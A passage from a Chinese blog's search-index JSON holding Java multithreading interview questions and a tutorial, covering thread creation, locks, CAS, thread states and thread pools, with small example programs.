在Spring的AOP编程中:如果加入容器的目标对象有实现接口，用JDK代理，如果目标对象没有实现接口,用Cglib代理。","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"代理方式","slug":"代理方式","permalink":"http://xiaohublog.cn/tags/%E4%BB%A3%E7%90%86%E6%96%B9%E5%BC%8F/"}]},{"title":"JAVA多线程面试题","slug":"多线程面试题","date":"2021-02-05T05:27:01.000Z","updated":"2021-02-24T09:17:31.893Z","comments":true,"path":"2021/02/05/多线程面试题/","link":"","permalink":"http://xiaohublog.cn/2021/02/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"","text":"1、并发编程三要素？ 1）原子性 原子性指的是一个或者多个操作，要么全部执行并且在执行的过程中不被其他操作打断，要么就全部都不执行。 2）可见性 可见性指多个线程操作一个共享变量时，其中一个线程对变量进行修改后，其他线程可以立即看到修改的结果。 3）有序性 有序性，即程序的执行顺序按照代码的先后顺序来执行。 2、实现可见性的方法有哪些？ synchronized或者Lock：保证同一个时刻只有一个线程获取锁执行代码，锁释放之前把最新的值刷新到主内存，实现可见性。 3、多线程的价值？ 1）发挥多核CPU的优势 多线程，可以真正发挥出多核CPU的优势来，达到充分利用CPU的目的，采用多线程的方式去同时完成几件事情而不互相干扰。 2）防止阻塞 从程序运行效率的角度来看，单核CPU不但不会发挥出多线程的优势，反而会因为在单核CPU上运行多线程导致线程上下文的切换，而降低程序整体的效率。但是单核CPU我们还是要应用多线程，就是为了防止阻塞。试想，如果单核CPU使用单线程，那么只要这个线程阻塞了，比方说远程读取某个数据吧，对端迟迟未返回又没有设置超时时间，那么你的整个程序在数据返回回来之前就停止运行了。多线程可以防止这个问题，多条线程同时运行，哪怕一条线程的代码执行读取数据阻塞，也不会影响其它任务的执行。 3）便于建模 这是另外一个没有这么明显的优点了。假设有一个大的任务A，单线程编程，那么就要考虑很多，建立整个程序模型比较麻烦。但是如果把这个大的任务A分解成几个小任务，任务B、任务C、任务D，分别建立程序模型，并通过多线程分别运行这几个任务，那就简单很多了。 4、创建线程的有哪些方式？ 1）继承Thread类创建线程类 2）通过Runnable接口创建线程类 3）通过Callable和Future创建线程 4）通过线程池创建 5、创建线程的三种方式的对比？ 1）采用实现Runnable、Callable接口的方式创建多线程。 优势是： 线程类只是实现了Runnable接口或Callable接口，还可以继承其他类。 在这种方式下，多个线程可以共享同一个target对象，所以非常适合多个相同线程来处理同一份资源的情况，从而可以将CPU、代码和数据分开，形成清晰的模型，较好地体现了面向对象的思想。 劣势是： 编程稍微复杂，如果要访问当前线程，则必须使用Thread.currentThread()方法。 2）使用继承Thread类的方式创建多线程 优势是： 编写简单，如果需要访问当前线程，则无需使用Thread.currentThread()方法，直接使用this即可获得当前线程。 劣势是： 线程类已经继承了Thread类，所以不能再继承其他父类。 3）Runnable和Callable的区别 Callable规定（重写）的方法是call()，Runnable规定（重写）的方法是run()。Callable的任务执行后可返回值，而Runnable的任务是不能返回值的。Call方法可以抛出异常，run方法不可以。运行Callable任务可以拿到一个Future对象，表示异步计算的结果。它提供了检查计算是否完成的方法，以等待计算的完成，并检索计算的结果。通过Future对象可以了解任务执行情况，可取消任务的执行，还可获取执行结果。 6、线程的状态流转图 线程的生命周期及五种基本状态： 7、Java线程具有五中基本状态 1）新建状态（New）：当线程对象对创建后，即进入了新建状态，如：Thread t = new MyThread()； 2）就绪状态（Runnable）：当调用线程对象的start()方法（t.start();），线程即进入就绪状态。处于就绪状态的线程，只是说明此线程已经做好了准备，随时等待CPU调度执行，并不是说执行了t.start()此线程立即就会执行； 3）运行状态（Running）：当CPU开始调度处于就绪状态的线程时，此时线程才得以真正执行，即进入到运行状态。注：就绪状态是进入到运行状态的唯一入口，也就是说，线程要想进入运行状态执行，首先必须处于就绪状态中； 4）阻塞状态（Blocked）：处于运行状态中的线程由于某种原因，暂时放弃对CPU的使用权，停止执行，此时进入阻塞状态，直到其进入到就绪状态，才 有机会再次被CPU调用以进入到运行状态。 根据阻塞产生的原因不同，阻塞状态又可以分为三种： a.等待阻塞：运行状态中的线程执行wait()方法，使本线程进入到等待阻塞状态； b.同步阻塞 – 线程在获取synchronized同步锁失败(因为锁被其它线程所占用)，它会进入同步阻塞状态； c.其他阻塞 – 通过调用线程的sleep()或join()或发出了I/O请求时，线程会进入到阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。 5）死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。 8、什么是线程池？有哪几种创建方式？ 线程池就是提前创建若干个线程，如果有任务需要处理，线程池里的线程就会处理任务，处理完之后线程并不会被销毁，而是等待下一个任务。由于创建和销毁线程都是消耗系统资源的，所以当你想要频繁的创建和销毁线程的时候就可以考虑使用线程池来提升系统的性能。 java 提供了一个 java.util.concurrent.Executor接口的实现用于创建线程池。 9、四种线程池的创建： 1）newCachedThreadPool创建一个可缓存线程池 2）newFixedThreadPool 创建一个定长线程池，可控制线程最大并发数。 3）newScheduledThreadPool 创建一个定长线程池，支持定时及周期性任务执行。 4）newSingleThreadExecutor 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务。 10、线程池的优点？ 1）重用存在的线程，减少对象创建销毁的开销。 2）可有效的控制最大并发线程数，提高系统资源的使用率，同时避免过多资源竞争，避免堵塞。 3）提供定时执行、定期执行、单线程、并发数控制等功能。 11、常用的并发工具类有哪些？ CountDownLatchCyclicBarrierSemaphoreExchanger 12、CyclicBarrier和CountDownLatch的区别 1）CountDownLatch简单的说就是一个线程等待，直到他所等待的其他线程都执行完成并且调用countDown()方法发出通知后，当前线程才可以继续执行。 2）cyclicBarrier是所有线程都进行等待，直到所有线程都准备好进入await()方法之后，所有线程同时开始执行！ 3）CountDownLatch的计数器只能使用一次。而CyclicBarrier的计数器可以使用reset() 方法重置。所以CyclicBarrier能处理更为复杂的业务场景，比如如果计算发生错误，可以重置计数器，并让线程们重新执行一次。 4）CyclicBarrier还提供其他有用的方法，比如getNumberWaiting方法可以获得CyclicBarrier阻塞的线程数量。isBroken方法用来知道阻塞的线程是否被中断。如果被中断返回true，否则返回false。 13、synchronized的作用？ 在Java中，synchronized关键字是用来控制线程同步的，就是在多线程的环境下，控制synchronized代码段不被多个线程同时执行。 synchronized既可以加在一段代码上，也可以加在方法上。 14、volatile关键字的作用 对于可见性，Java提供了volatile关键字来保证可见性。 当一个共享变量被volatile修饰时，它会保证修改的值会立即被更新到主存，当有其他线程需要读取时，它会去内存中读取新值。 从实践角度而言，volatile的一个重要作用就是和CAS结合，保证了原子性，详细的可以参见java.util.concurrent.atomic包下的类，比如AtomicInteger。 15、什么是CAS CAS是compare and swap的缩写，即我们所说的比较交换。 cas是一种基于锁的操作，而且是乐观锁。在java中锁分为乐观锁和悲观锁。悲观锁是将资源锁住，等一个之前获得锁的线程释放锁之后，下一个线程才可以访问。而乐观锁采取了一种宽泛的态度，通过某种方式不加锁来处理资源，比如通过给记录加version来获取数据，性能较悲观锁有很大的提高。 CAS 操作包含三个操作数 —— 内存位置（V）、预期原值（A）和新值(B)。如果内存地址里面的值和A的值是一样的，那么就将内存里面的值更新成B。CAS是通过无限循环来获取数据的，若果在第一轮循环中，a线程获取地址里面的值被b线程修改了，那么a线程需要自旋，到下次循环才有可能机会执行。 java.util.concurrent.atomic 包下的类大多是使用CAS操作来实现的( AtomicInteger,AtomicBoolean,AtomicLong)。 16、CAS的问题 1）CAS容易造成ABA问题 一个线程a将数值改成了b，接着又改成了a，此时CAS认为是没有变化，其实是已经变化过了，而这个问题的解决方案可以使用版本号标识，每操作一次version加1。在java5中，已经提供了AtomicStampedReference来解决问题。 2） 不能保证代码块的原子性 CAS机制所保证的知识一个变量的原子性操作，而不能保证整个代码块的原子性。比如需要保证3个变量共同进行原子性的更新，就不得不使用synchronized了。 3）CAS造成CPU利用率增加 之前说过了CAS里面是一个循环判断的过程，如果线程一直没有获取到状态，cpu资源会一直被占用。 17、什么是Future？ 在并发编程中，我们经常用到非阻塞的模型，在之前的多线程的三种实现中，不管是继承thread类还是实现runnable接口，都无法保证获取到之前的执行结果。通过实现Callback接口，并用Future可以来接收多线程的执行结果。 Future表示一个可能还没有完成的异步任务的结果，针对这个结果可以添加Callback以便在任务执行成功或失败后作出相应的操作。 18、什么是AQS AQS是AbustactQueuedSynchronizer的简称，它是一个Java提高的底层同步工具类，用一个int类型的变量表示同步状态，并提供了一系列的CAS操作来管理这个同步状态。 AQS是一个用来构建锁和同步器的框架，使用AQS能简单且高效地构造出应用广泛的大量的同步器，比如我们提到的ReentrantLock，Semaphore，其他的诸如ReentrantReadWriteLock，SynchronousQueue，FutureTask等等皆是基于AQS的。 19、AQS支持两种同步方式： 1）独占式 2）共享式 这样方便使用者实现不同类型的同步组件，独占式如ReentrantLock，共享式如Semaphore，CountDownLatch，组合式的如ReentrantReadWriteLock。总之，AQS为使用提供了底层支撑，如何组装实现，使用者可以自由发挥。 20、ReadWriteLock是什么 首先明确一下，不是说ReentrantLock不好，只是ReentrantLock某些时候有局限。如果使用ReentrantLock，可能本身是为了防止线程A在写数据、线程B在读数据造成的数据不一致，但这样，如果线程C在读数据、线程D也在读数据，读数据是不会改变数据的，没有必要加锁，但是还是加锁了，降低了程序的性能。 因为这个，才诞生了读写锁ReadWriteLock。ReadWriteLock是一个读写锁接口，ReentrantReadWriteLock是ReadWriteLock接口的一个具体实现，实现了读写的分离，读锁是共享的，写锁是独占的，读和读之间不会互斥，读和写、写和读、写和写之间才会互斥，提升了读写的性能。 21、FutureTask是什么 这个其实前面有提到过，FutureTask表示一个异步运算的任务。FutureTask里面可以传入一个Callable的具体实现类，可以对这个异步运算的任务的结果进行等待获取、判断是否已经完成、取消任务等操作。当然，由于FutureTask也是Runnable接口的实现类，所以FutureTask也可以放入线程池中。 22、synchronized和ReentrantLock的区别 synchronized是和if、else、for、while一样的关键字，ReentrantLock是类，这是二者的本质区别。既然ReentrantLock是类，那么它就提供了比synchronized更多更灵活的特性，可以被继承、可以有方法、可以有各种各样的类变量，ReentrantLock比synchronized的扩展性体现在几点上： 1）ReentrantLock可以对获取锁的等待时间进行设置，这样就避免了死锁 2）ReentrantLock可以获取各种锁的信息 3）ReentrantLock可以灵活地实现多路通知 另外，二者的锁机制其实也是不一样的。ReentrantLock底层调用的是Unsafe的park方法加锁，synchronized操作的应该是对象头中mark word，这点我不能确定。 23、什么是乐观锁和悲观锁 1）乐观锁：就像它的名字一样，对于并发间操作产生的线程安全问题持乐观状态，乐观锁认为竞争不总是会发生，因此它不需要持有锁，将比较-替换这两个动作作为一个原子操作尝试去修改内存中的变量，如果失败则表示发生冲突，那么就应该有相应的重试逻辑。 2）悲观锁：还是像它的名字一样，对于并发间操作产生的线程安全问题持悲观状态，悲观锁认为竞争总是会发生，因此每次对某资源进行操作时，都会持有一个独占的锁，就像synchronized，不管三七二十一，直接上了锁就操作资源了。 24、线程B怎么知道线程A修改了变量 volatile修饰变量synchronized修饰修改变量的方法wait/notifywhile轮询 25、synchronized、volatile、CAS比较 synchronized是悲观锁，属于抢占式，会引起其他线程阻塞。volatile提供多线程共享变量可见性和禁止指令重排序优化。CAS是基于冲突检测的乐观锁（非阻塞） 26、sleep方法和wait方法有什么区别? 这个问题常问，sleep方法和wait方法都可以用来放弃CPU一定的时间，不同点在于如果线程持有某个对象的监视器，sleep方法不会放弃这个对象的监视器，wait方法会放弃这个对象的监视器 27、ThreadLocal是什么？有什么用？ ThreadLocal是一个本地线程副本变量工具类。主要用于将私有线程和该线程存放的副本对象做一个映射，各个线程之间的变量互不干扰，在高并发场景下，可以实现无状态的调用，特别适用于各个线程依赖不通的变量值完成操作的场景。 简单说ThreadLocal就是一种以空间换时间的做法，在每个Thread里面维护了一个以开地址法实现的ThreadLocal.ThreadLocalMap，把数据进行隔离，数据不共享，自然就没有线程安全方面的问题了。 28、为什么wait()方法和notify()/notifyAll()方法要在同步块中被调用 这是JDK强制的，wait()方法和notify()/notifyAll()方法在调用前都必须先获得对象的锁 29、多线程同步有哪几种方法？ Synchronized关键字，Lock锁实现，分布式锁等。 30、线程的调度策略 线程调度器选择优先级最高的线程运行，但是，如果发生以下情况，就会终止线程的运行： 1）线程体中调用了yield方法让出了对cpu的占用权利 2）线程体中调用了sleep方法使线程进入睡眠状态 3）线程由于IO操作受到阻塞 4）另外一个更高优先级线程出现 5）在支持时间片的系统中，该线程的时间片用完 31、ConcurrentHashMap的并发度是什么 ConcurrentHashMap的并发度就是segment的大小，默认为16，这意味着最多同时可以有16条线程操作ConcurrentHashMap，这也是ConcurrentHashMap对Hashtable的最大优势，任何情况下，Hashtable能同时有两条线程获取Hashtable中的数据吗？ 32、Linux环境下如何查找哪个线程使用CPU最长 1）获取项目的pid，jps或者ps -ef | grep java，这个前面有讲过 2）top -H -p pid，顺序不能改变 33、Java死锁以及如何避免？ Java中的死锁是一种编程情况，其中两个或多个线程被永久阻塞，Java死锁情况出现至少两个线程和两个或更多资源。 Java发生死锁的根本原因是：在申请锁时发生了交叉闭环申请。 34、死锁的原因 1）是多个线程涉及到多个锁，这些锁存在着交叉，所以可能会导致了一个锁依赖的闭环。 例如：线程在获得了锁A并且没有释放的情况下去申请锁B，这时，另一个线程已经获得了锁B，在释放锁B之前又要先获得锁A，因此闭环发生，陷入死锁循环。 2）默认的锁申请操作是阻塞的。 所以要避免死锁，就要在一遇到多个对象锁交叉的情况，就要仔细审查这几个对象的类中的所有方法，是否存在着导致锁依赖的环路的可能性。总之是尽量避免在一个同步方法中调用其它对象的延时方法和同步方法。 35、怎么唤醒一个阻塞的线程 如果线程是因为调用了wait()、sleep()或者join()方法而导致的阻塞，可以中断线程，并且通过抛出InterruptedException来唤醒它；如果线程遇到了IO阻塞，无能为力，因为IO是操作系统实现的，Java代码并没有办法直接接触到操作系统。 36、不可变对象对多线程有什么帮助 前面有提到过的一个问题，不可变对象保证了对象的内存可见性，对不可变对象的读取不需要进行额外的同步手段，提升了代码执行效率。 37、什么是多线程的上下文切换 多线程的上下文切换是指CPU控制权由一个已经正在运行的线程切换到另外一个就绪并等待获取CPU执行权的线程的过程。 38、如果你提交任务时，线程池队列已满，这时会发生什么 这里区分一下： 1）如果使用的是无界队列LinkedBlockingQueue，也就是无界队列的话，没关系，继续添加任务到阻塞队列中等待执行，因为LinkedBlockingQueue可以近乎认为是一个无穷大的队列，可以无限存放任务 2）如果使用的是有界队列比如ArrayBlockingQueue，任务首先会被添加到ArrayBlockingQueue中，ArrayBlockingQueue满了，会根据maximumPoolSize的值增加线程数量，如果增加了线程数量还是处理不过来，ArrayBlockingQueue继续满，那么则会使用拒绝策略RejectedExecutionHandler处理满了的任务，默认是AbortPolicy 39、Java中用到的线程调度算法是什么 抢占式。一个线程用完CPU之后，操作系统会根据线程优先级、线程饥饿情况等数据算出一个总的优先级并分配下一个时间片给某个线程执行。 40、什么是线程调度器(Thread Scheduler)和时间分片(Time Slicing)？ 线程调度器是一个操作系统服务，它负责为Runnable状态的线程分配CPU时间。一旦我们创建一个线程并启动它，它的执行便依赖于线程调度器的实现。时间分片是指将可用的CPU时间分配给可用的Runnable线程的过程。分配CPU时间可以基于线程优先级或者线程等待的时间。线程调度并不受到Java虚拟机控制，所以由应用程序来控制它是更好的选择（也就是说不要让你的程序依赖于线程的优先级）。 41、什么是自旋 很多synchronized里面的代码只是一些很简单的代码，执行时间非常快，此时等待的线程都加锁可能是一种不太值得的操作，因为线程阻塞涉及到用户态和内核态切换的问题。既然synchronized里面的代码执行得非常快，不妨让等待锁的线程不要被阻塞，而是在synchronized的边界做忙循环，这就是自旋。如果做了多次忙循环发现还没有获得锁，再阻塞，这样可能是一种更好的策略。 42、JavaConcurrency API中的Lock接口(Lockinterface)是什么？对比同步它有什么优势？ Lock接口比同步方法和同步块提供了更具扩展性的锁操作。他们允许更灵活的结构，可以具有完全不同的性质，并且可以支持多个相关类的条件对象。 它的优势有： 可以使锁更公平可以使线程在等待锁的时候响应中断可以让线程尝试获取锁，并在无法获取锁的时候立即返回或者等待一段时间可以在不同的范围，以不同的顺序获取和释放锁 43、单例模式的线程安全性 老生常谈的问题了，首先要说的是单例模式的线程安全意味着：某个类的实例在多线程环境下只会被创建一次出来。单例模式有很多种的写法，我总结一下： 1）饿汉式单例模式的写法：线程安全 2）懒汉式单例模式的写法：非线程安全 3）双检锁单例模式的写法：线程安全 44、Semaphore有什么作用 Semaphore就是一个信号量，它的作用是限制某段代码块的并发数。Semaphore有一个构造函数，可以传入一个int型整数n，表示某段代码最多只有n个线程可以访问，如果超出了n，那么请等待，等到某个线程执行完毕这段代码块，下一个线程再进入。由此可以看出如果Semaphore构造函数中传入的int型整数n=1，相当于变成了一个synchronized了。 45、Executors类是什么？ Executors为Executor，ExecutorService，ScheduledExecutorService，ThreadFactory和Callable类提供了一些工具方法。 Executors可以用于方便的创建线程池 46、线程类的构造方法、静态块是被哪个线程调用的 这是一个非常刁钻和狡猾的问题。请记住：线程类的构造方法、静态块是被new这个线程类所在的线程所调用的，而run方法里面的代码才是被线程自身所调用的。 如果说上面的说法让你感到困惑，那么我举个例子，假设Thread2中new了Thread1，main函数中new了Thread2，那么： 1）Thread2的构造方法、静态块是main线程调用的，Thread2的run()方法是Thread2自己调用的 2）Thread1的构造方法、静态块是Thread2调用的，Thread1的run()方法是Thread1自己调用的 47、同步方法和同步块，哪个是更好的选择? 同步块，这意味着同步块之外的代码是异步执行的，这比同步整个方法更提升代码的效率。请知道一条原则：同步的范围越小越好。 48、Java线程数过多会造成什么异常？ 1）线程的生命周期开销非常高 2）消耗过多的CPU资源 如果可运行的线程数量多于可用处理器的数量，那么有线程将会被闲置。大量空闲的线程会占用许多内存，给垃圾回收器带来压力，而且大量的线程在竞争CPU资源时还将产生其他性能的开销。 3）降低稳定性 JVM在可创建线程的数量上存在一个限制，这个限制值将随着平台的不同而不同，并且承受着多个因素制约，包括JVM的启动参数、Thread构造函数中请求栈的大小，以及底层操作系统对线程的限制等。如果破坏了这些限制，那么可能抛出OutOfMemoryError异常","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://xiaohublog.cn/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"多线程","slug":"多线程","permalink":"http://xiaohublog.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"JAVA多线程知识点总结","slug":"多线程","date":"2021-02-05T04:27:01.000Z","updated":"2021-02-24T09:19:17.791Z","comments":true,"path":"2021/02/05/多线程/","link":"","permalink":"http://xiaohublog.cn/2021/02/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"java多线程线程开启不一定执行，由CPU调度执行。 为什么要引入多线程? 原有的调度单位不够用了，必须引入一个新的调度单位才能解决一些问题，引入新的调度单位后，在算法不变的情况下，可以有效的提升执行速度和CPU的利用率。 三种创建线程的方法： 继承Thread类 实现Runnable接口 实现Callable接口 （一）继承Thread类继承Thread类，重写run（）方法，调用start()方法开启线程 1234567891011121314151617181920212223package com.ping.base.Demo01;//线程创建方法之一：继承Thread类，重写run()方法，调用start开启线程public class TestTeread1 extends Thread&#123; @Override public void run() &#123; //run方法线程体 for (int i = 0; i &lt; 20; i++) &#123; System.out.println(&quot;我在吃饭&quot;); &#125; &#125; public static void main(String[] args) &#123; TestTeread1 testTeread1 = new TestTeread1(); testTeread1.start(); //main线程，主线程 for (int i = 0; i &lt; 20; i++) &#123; System.out.println(&quot;我在睡觉&quot;); &#125; &#125;&#125; （二）实现Runnable接口(推荐使用)如果一个类继承Thread，则不适合资源恭喜。但是如果实现了Runable接口的话，则很容易实现资源共享。 实现Runnable接口比继承Thread类所具有的优势: 适合多个相同的程序代码去处理同一个资源 可以避免java中的单继承机制 增加程序的健壮性，代码可以被多个线程共享，代码和数据独立 1234567891011121314151617181920212223package com.ping.base.Demo01;//线程创建方法二：实现Runnable接口，重写run方法，执行线程需要丢入Runnable接口实现类，调用start方法public class TestThread2 implements Runnable&#123; @Override public void run() &#123; for (int i = 0; i &lt; 200; i++) &#123; System.out.println(&quot;我在学习&quot;); &#125; &#125; public static void main(String[] args) &#123; //启动线程 TestThread2 testThread2 = new TestThread2();// Thread thread = new Thread(testThread2);// thread.start(); new Thread(testThread2).start(); for (int i = 0; i &lt; 200; i++) &#123; System.out.println(&quot;我在睡觉&quot;); &#125; &#125;&#125; 多个线程操作同一对象，买车票实例 123456789101112131415161718192021222324252627282930package com.ping.base.Demo01;//多个线程同时操作一个对象//买火车票的例子public class TestThread3 implements Runnable &#123; private int ticketNums = 10; @Override public void run() &#123; while (true) &#123; if (ticketNums &lt;= 0) break; try &#123; Thread.sleep(200); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName() + &quot;--&gt;拿到了第&quot; + ticketNums-- + &quot;票&quot;); &#125; &#125; public static void main(String[] args) &#123; TestThread3 ticket = new TestThread3(); new Thread(ticket,&quot;小红&quot;).start(); new Thread(ticket,&quot;小明&quot;).start(); new Thread(ticket,&quot;黄牛&quot;).start(); &#125;&#125; 但是通过结果可以知道这是存在问题的，会出现多个用户同时买到同一张票的情况 多线程之龟兔赛跑实例 首先来个赛道距离, 然后要离终点越来越近 判断比赛是否结束 打印出胜利者 龟兔赛跑开始 故事中是乌龟赢的, 兔子需要睡觉, 所以我们来模拟兔子睡觉 终于, 乌龟赢得比赛 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.ping.base.Demo01;//龟兔赛跑实例public class Race implements Runnable &#123; private static String winner; @Override public void run() &#123; for (int i = 0; i &lt;= 100; i++) &#123; //让兔子休息 if (Thread.currentThread().getName().equals(&quot;兔子&quot;) &amp;&amp; i == 20) &#123; try &#123; Thread.sleep(10); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; //判断是否结束比赛 boolean flag = gameOver(i); if (flag) &#123; break; &#125; System.out.println(Thread.currentThread().getName() + &quot;走了&quot; + i + &quot;步&quot;); &#125; &#125; private boolean gameOver(int steps) &#123; //判断是否已经存在胜利者 if (winner != null) &#123; //如果已经存在胜利者 return true; &#125; if (steps == 100) &#123; winner = Thread.currentThread().getName(); System.out.println(&quot;winner is &quot; + winner); return true; &#125; return false; &#125; public static void main(String[] args) &#123; Race race = new Race(); new Thread(race,&quot;乌龟&quot;).start(); new Thread(race,&quot;兔子&quot;).start(); &#125;&#125; （三）实现Callable接口（了解即可） 实现Callable接口，需要返回值类型 重写call方法，需要抛出异常 创建目标对象 创建执行服务：ExecutorService ser = Executors.newFixedThreadPool(1); 提交执行：Future result1 = ser.submit(1); 获取结果：boolean r1 = result1.get(); 关闭服务：ser.shutdownNow(); 优点： 有返回值 可以抛出异常 Callable实现实例 12345678910111213141516171819202122232425262728public class TestThread4 implements Callable &#123; //重写call方法 @Override public Object call() throws Exception &#123; return getMessage(); &#125; public String getMessage() throws InterruptedException &#123; Thread.sleep(200); return &quot;我是返回信息&quot;; &#125; //启动线程 public static void main(String[] args) throws ExecutionException, InterruptedException &#123; TestThread4 testThread4 = new TestThread4(); //创建执行服务 ExecutorService ser = Executors.newFixedThreadPool(1); //提交执行 Future&lt;String&gt; str = ser.submit(testThread4); //获取结果 String result = str.get(); System.out.println(result); //关闭服务 ser.shutdownNow(); &#125;&#125; 线程方法setPriority(int newPriority) —&gt;更改线程优先级 static void sleep(long millis) —&gt;在指定的毫秒数内让当前正在执行的线程休眠 void join() —&gt;等待该线程终止 void interrupt() —&gt;中断线程，一般不用这个方法 boolean isAlive() —&gt;测试线程是否处于活动状态 线程停止 不推荐使用JDK提供的Stop()、destroy()方法。 推荐线程自己停止下来 建议使用一个标志位进行终止变量，当flag = false，则终止线程运行 12345678910111213141516public class TestStop implements Runnable &#123; //1.线程中定义线程体使用的标识 private boolean flag = true; @Override public void run() &#123; //2.线程体使用该标识 while (flag) &#123; System.out.println(&quot;run...Thread&quot;); &#125; &#125; //3.对外提供方法改变标识 public void stop() &#123; this.flag = false; &#125;&#125; 线程休眠 sleep(时间)指定当前线程阻塞的毫秒数 sleep存在异常InterruptedException sleep时间达到后线程进入就绪态 sleep可以模拟网络延时，倒计时等 每个对象都有一个锁，sleep不会释放锁 线程礼让（yield） 礼让线程，让当前正在执行的线程暂停，但不阻塞 将线程从运行态转为就绪状态 让CPU重新调度，礼让不一定成功，看CPU心情 1234567891011121314151617181920//测试礼让线程//礼让不一定成功public class TestYield &#123; public static void main(String[] args) &#123; MyYield myYield = new MyYield(); new Thread(myYield,&quot;a&quot;).start(); new Thread(myYield,&quot;b&quot;).start(); &#125;&#125; class MyYield implements Runnable &#123; @Override public void run() &#123; System.out.println(Thread.currentThread().getName() + &quot;线程开始执行&quot;); Thread.yield(); //礼让 System.out.println(&quot;线程停止执行&quot;); &#125;&#125; 线程强制执行（join）观测线程状态 new：尚未启动的线程处于此状态 block:在java虚拟机中执行的线程处于此状态 waiting:正在等待另一个线程执行特定动作的线程处于此状态 timed_waiting:正在等待另一个线程执行动作达到指定等待时间的线程处于此状态 terminated:已退出的线程处于此状态 代码实例 1234567891011121314151617181920212223242526272829303132package com.ping.base.Demo01;public class TestThreadState &#123; public static void main(String[] args) throws InterruptedException &#123; Thread thread = new Thread(()-&gt; &#123; for (int i = 0; i &lt; 5; i++) &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; System.out.println(&quot;----------&quot;); &#125;); //更新状态 Thread.State state = thread.getState(); System.out.println(state); //观察启动后线程的状态 thread.start(); state = thread.getState(); System.out.println(state); while (state != Thread.State.TERMINATED) &#123; Thread.sleep(100); state = thread.getState(); System.out.println(state); &#125; &#125;&#125; 线程优先级JAVA提供一个线程调度起来监控程序中启动后进入就绪状态的所有线程，线程调度器会按照优先级决定应该调度哪个线程来执行。 线程的优先级用数字表示，范围从1—10 使用以下方式改变或获取优先级 getPriority() setPriority() 守护线程 线程分为用户线程和守护线程 虚拟机必须确保用户线程执行完毕 虚拟机不用等待守护线程执行完毕 如，后台记录操作日志，监控内存，垃圾回收等待 使用以下语句设为守护线程： 1thread.setDaemon(true); 线程同步多线程共享数据时，会发生线程不安全的情况，多线程共享数据必须同步。实现同步的三种方法： 使用同步代码块（synchronized） 使用同步方法 使用互斥锁ReetrantLock（更灵活的代码控制） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import java.util.concurrent.locks.ReentrantLock;public class SyncThreadDemo &#123; public static void main(String[] args) &#123; MyRunnable mr = new MyRunnable(); new Thread(mr).start(); new Thread(mr).start(); &#125;&#125;class MyRunnable implements Runnable &#123; private int tickts = 10; @Override public void run() &#123; for (int i = 0; i &lt; 100; i++) &#123;// if (tickts &gt; 0) &#123; // 方法一：使用同步代码块// synchronized (this) &#123;// System.out.println(&quot;第&quot; + (tickts--) + &quot;张票售出&quot;);// try &#123;// Thread.sleep(100);// &#125; catch (InterruptedException e) &#123;// e.printStackTrace();// &#125;// &#125;// &#125; // 方法二：使用同步方法达到线程安全 saleTickts(); // 方法三：使用ReentrantLock，更加灵活，可以加入判断，在特定的情况下释放锁 saleTickts2(); &#125;// for &#125; // 同步方法：同步的是当前对象 private synchronized void saleTickts() &#123; if (tickts &gt; 0) &#123; System.out.println(&quot;第&quot; + (tickts--) + &quot;张票售出&quot;); try &#123; Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;// saleTickts ReentrantLock lock = new ReentrantLock(); // 方法三：使用ReentrantLock，更加灵活，可以加入判断，在特定的情况下释放锁 private void saleTickts2() &#123; lock.lock(); try &#123; if (tickts &gt; 0) &#123; System.out.println(&quot;第&quot; + (tickts--) + &quot;张票售出&quot;); try &#123; Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; // 保证锁一定会被释放，不会出现死锁情况 &#125; finally &#123; lock.unlock();// 释放锁 &#125; &#125;// saleTickts2&#125; 同步块：synchronized(Obj) {} Obj称之为同步监视器 Obj可以是任何对象，但是推荐使用共享资源作为同步监视器 同步方法中无需指定同步监视器，因为方法的同步监视器就是this，就是这个对象本身，或者是class 同步监视器的执行过程（锁的对象就是变化的量，需要增删改的对象） 第一个线程访问，锁定同步监视器，执行其中代码 第二个线程访问，发现同步监视器被锁定，无法访问 第一个线程访问完毕，解锁同步监视器 第二个线程访问，发现同步监视器没有锁，然后锁定并访问 synchronized与Lock的对比 Lock是显示锁（手动开启和关闭锁，别忘记关闭锁），而synchronized是隐式锁，出了作用域自动释放 Lock只有代码块锁，而synchronized有代码块锁和方法锁 使用Lock锁，JVM将花费较少的时间来调度线程，性能更好，并且具有更好的扩展性（提供更多的子类） 优先使用顺序：Lock&gt;同步代码块（已经进入方法体，分配了相应资源）&gt;同步方法（在方法体之外） 线程死锁产生死锁的四个必要条件 互斥条件：一个资源每次只能被一个进程使用 请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放 不剥夺条件：进程已获得的资源，在未使用之前，不能强行剥夺 循环等待条件：若干进程之间形成一种头尾相接的循环等待资源关系 只要破坏任意一个，就能避免线程死锁 线程池线程池就是提前创建若干线程，如果有任务需要处理，线程池里的任务就会处理任务，处理完之后线程不会被销毁，而是等待下一个任务，由于创建和销毁线程都是消耗系统资源的，所以当你想要频繁的创建和销毁线程的时候就可以考虑使用线程池来提升系统性能。 JDK5.0起提供了线程相关API:ExecutorService和Executors ExecutorService:真正的线程池接口，常见子类ThreadPoolExecutor void execute(Runnable command):执行任务/命令，没有返回值，一般用来执行Runnable Futuresubmit(Callable task):执行任务，有返回值，一般用来执行Callable 